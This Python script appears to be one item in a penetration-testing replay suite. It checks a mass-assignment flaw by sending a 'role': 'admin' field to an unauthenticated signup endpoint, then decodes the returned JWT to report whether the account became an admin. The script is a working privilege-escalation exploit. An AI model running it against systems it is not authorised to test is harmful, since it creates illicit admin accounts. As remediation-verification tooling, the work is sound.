#!/usr/bin/env python3
"""pt12: the public registration endpoint accepts a client-supplied role.

POST /api/Users, the fully unauthenticated public signup form, accepts
a "role" field and assigns it outright. Including "role": "admin"
alongside the normal signup fields creates a genuine admin account.
No exploit beyond one extra field, no prior authentication at all,
unlike every other item in this repo.

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt12-001.json"


def _jwt_payload(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _request(method: str, url: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str, extra_fields: dict | None = None) -> tuple[int, str, str]:
    email = f"pt12-{label}-{stamp}@flatline.test"
    password = "Pt12Pass123!"
    body = {"email": email, "password": password, "passwordRepeat": password, **(extra_fields or {})}
    reg_status, _ = _request("POST", f"{target}/api/Users", body=body)
    status, login_body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return reg_status, login_body["authentication"]["token"], email


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    reg_status, token, email = _register_and_login(target, "exploit", stamp, extra_fields=blueprint["attack_field"])
    role = _jwt_payload(token)["data"]["role"]

    if role == "customer":
        status = "REMEDIATED"
        summary = f"Registration with role=admin in the body still resulted in role={role!r}."
    elif role == "admin":
        status = "VULNERABLE"
        summary = f"A fully unauthenticated registration with role=admin in the body created a real admin account ({email}), no exploit beyond that one field."
    else:
        status = "ERROR"
        summary = f"Inconclusive: registration HTTP {reg_status}, resulting role={role!r}."

    _, legit_token, _ = _register_and_login(target, "legit", stamp)
    legit_role = _jwt_payload(legit_token)["data"]["role"]
    legitimate_default_role_ok = legit_role == "customer"

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "registration_http_status": reg_status,
        "resulting_role": role,
        "summary": summary,
        "legitimate_default_role_ok": legitimate_default_role_ok,
        "legitimate_default_role": legit_role,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt12-mass-assignment-admin-registration", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
